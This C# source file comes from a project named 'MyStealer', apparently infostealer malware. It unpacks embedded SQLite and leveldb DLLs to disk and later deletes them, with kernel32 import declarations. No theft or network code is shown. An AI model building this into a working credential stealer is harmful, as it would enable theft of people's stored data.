using MyStealer.Properties;
using Serilog;
using System;
using System.IO;
using System.Runtime.InteropServices;

namespace MyStealer
{
    public static class NativeMethods
    {
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        internal static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        internal static extern bool FreeLibrary(IntPtr hModule);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        internal static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        internal static void WriteLibraries()
        {
            var is64 = Environment.Is64BitProcess;
            var data = is64 ? Resources.SQLiteInterop64 : Resources.SQLiteInterop86;
            File.WriteAllBytes("SQLite.Interop.dll", data);
            Log.Debug("Using {bit}-bit SQLite interop library", is64 ? 64 : 32);

            data = is64 ? Resources.leveldb64 : Resources.leveldb86;
            File.WriteAllBytes("leveldb.dll", data);
            Log.Debug("Using {bit}-bit leveldb library", is64 ? 64 : 32);
        }

        internal static void CleanupLibraries()
        {
            var file = new FileInfo("SQLite.Interop.dll");
            if (file.Exists)
            {
                Log.Debug("Deleted SQLite interop library file");
                file.Delete();
            }

            file = new FileInfo("leveldb.dll");
            if (file.Exists)
            {
                Log.Debug("Deleted leveldb library file");
                file.Delete();
            }
        }
    }
}
